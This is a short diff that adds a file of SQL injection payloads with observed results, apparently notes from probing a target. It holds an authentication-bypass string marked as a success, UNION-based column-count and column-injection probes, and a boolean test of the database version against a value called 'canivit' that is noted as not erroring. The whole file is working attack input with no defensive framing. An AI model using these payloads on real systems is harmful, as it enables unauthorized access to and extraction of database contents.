@@ -1,0 +1,5 @@
+' OR 1='1 (success)
+' UNION ORDER BY '1
+' UNION SELECT 'X', 'X', 'X
+canivit' AND (SELECT version()) LIKE '8% (does not give error)
+
